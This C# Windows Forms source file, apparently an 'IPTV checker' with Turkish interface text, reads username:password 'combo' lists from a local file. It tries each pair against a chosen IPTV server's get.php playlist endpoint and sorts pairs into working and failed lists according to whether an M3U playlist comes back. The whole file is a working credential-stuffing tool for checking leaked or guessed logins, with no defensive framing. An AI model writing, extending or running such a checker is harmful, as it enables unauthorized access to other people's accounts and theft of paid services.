using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Http;
using System.Diagnostics;
using System.IO;

namespace IPTVCHECKER_C_SHARP
{
    public partial class Form1 : Form
    {
        public static List<string> accounts = new List<string>();
        public static int accindex = 0;
        public static int total = 0;

        public static void LoadCombos(string fileName)
        {
            using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BufferedStream bufferedStream = new BufferedStream(fileStream))
                {
                    using (StreamReader streamReader = new StreamReader(bufferedStream))
                    {
                        while (streamReader.ReadLine() != null)
                        {
                            Form1.total++;
                        }
                    }
                }
            }
        }
        public Form1()
        {
            InitializeComponent();
        }
        private void labelayarla(string txt)
        {
            if (label2.InvokeRequired)
                label2.Invoke(new Action(() => label1.Text = txt));
            else
                label2.Text = txt;
        }
        private async void button1_Click(object sender, EventArgs e)
        {
            if ((textBox2.Text == ""))
            {
                MessageBox.Show("Lütfen Tüm Kutucuları Doldurunuz.", "IpTVChecker", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                for (int i = 0; i < Form1.accounts.Count; i++)
                {
                    string[] array = Form1.accounts[i].Split(new char[]
                        {
                            ':',
                            ';',
                            '|'
                        });
                    string text = array[0] + ":" + array[1];
                    if (richTextBox1.Text == "")
                    {
                        richTextBox1.Text = text;
                    }
                    else
                    {
                        richTextBox1.Text = richTextBox1.Text + "\r\n" + text;

                    }
                }
                textBox1.Text = "";
                for (int i = 0; i < Form1.accounts.Count; i++)
                {
                    string[] array = Form1.accounts[i].Split(new char[]
                        {
                            ':',
                            ';',
                            '|'
                        });
                    int satir = richTextBox1.Lines.Count();
                    int nsatir = satir - 1;
                        labelayarla(i + "/" + nsatir);
                    

                    if (i == nsatir)
                    {
                        MessageBox.Show("Bütün Combolar Tarandı!", "ipTVChecker", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    using (HttpClient client = new HttpClient())
                    {
                        HttpResponseMessage response = await client.GetAsync(textBox2.Text + "/get.php?username=" + array[0] + "&password=" + array[1] + "&type=m3u");

                        if (response.StatusCode.ToString() == "NotFound")
                        {
                            textBox3.Text = textBox3.Text + "\r\n" + textBox2.Text + "/get.php?username=" + array[0] + "&password=" + array[1] + "&type=m3u";
                        }
                        else
                        {
                            string m3u = await new WebClient().DownloadStringTaskAsync(textBox2.Text + "/get.php?username=" + array[0] + "&password=" + array[1] + "&type=m3u");
                            if (m3u.Contains("#EXTM3U") == true)
                            {
                                textBox1.Text = textBox1.Text + "\r\n" + textBox2.Text + "/get.php?username=" + array[0] + "&password=" + array[1] + "&type=m3u";
                            }
                            else
                            {
                                textBox3.Text = textBox3.Text + "\r\n" + textBox2.Text + "/get.php?username=" + array[0] + "&password=" + array[1] + "&type=m3u";

                            }
                        
                    }
                }
                }
            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void button2_Click(object sender, EventArgs e)
        {
            Process.Start("https://t.me/quiec");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/quiec");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Form1.accounts = new List<string>();
            Form1.LoadCombos("C:\\combo\\combo.txt");
            string[] combo = File.ReadAllLines("C:\\combo\\combo.txt");

            for (int i = 0; i < Form1.total; i++)
            {
                Form1.accounts.Add(combo[i]);
            }

        }
    }
}
